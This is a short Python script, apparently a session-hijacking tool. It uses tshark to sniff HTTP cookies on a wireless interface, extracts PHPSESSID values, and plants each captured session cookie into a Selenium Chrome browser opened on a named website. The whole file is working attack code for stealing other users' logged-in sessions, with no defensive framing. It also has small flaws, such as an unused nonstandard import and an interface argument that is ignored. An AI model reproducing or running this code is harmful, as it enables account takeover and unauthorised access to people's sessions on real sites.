import subprocess
from threading import Thread
import selenium.webdriver
import shlex
import sys
import io
import substring

class ARPSniffer:

	def testTshark(self, iface):
		print("Testing if tshark works. Using {}".format(iface))

		cmd = "tshark -i wlp2s0 -a duration:10 -l -Y http.request -T fields -e http.cookie"
		args = shlex.split(cmd)
		tshark = subprocess.Popen(args, stdout=subprocess.PIPE)
		for line in io.TextIOWrapper(tshark.stdout, encoding="utf-8"):
			c=line.partition("PHPSESSID=")[2].partition(";")[0]
			print("test: {} \n".format(line))
			driver = selenium.webdriver.Chrome()
			driver.get("http://www.mikolaj.ovh")
			driver.add_cookie({'name':'PHPSESSID', 'value':c, 'path':'/'})
			for cookie in driver.get_cookies():
				print ((cookie['name'], cookie['value']))


	def run(self, iface):
		try:
			t = Thread(target=self.testTshark, args=(iface, ))
			t.daemon = True
			t.start()
			t.join()
		except KeyboardInterrupt:
			print("\nExiting ARP monitor...")
			sys.exit(0)

if __name__ == '__main__':
	iface = 'wlp2s0'
	arps = ARPSniffer()
	arps.run(iface)
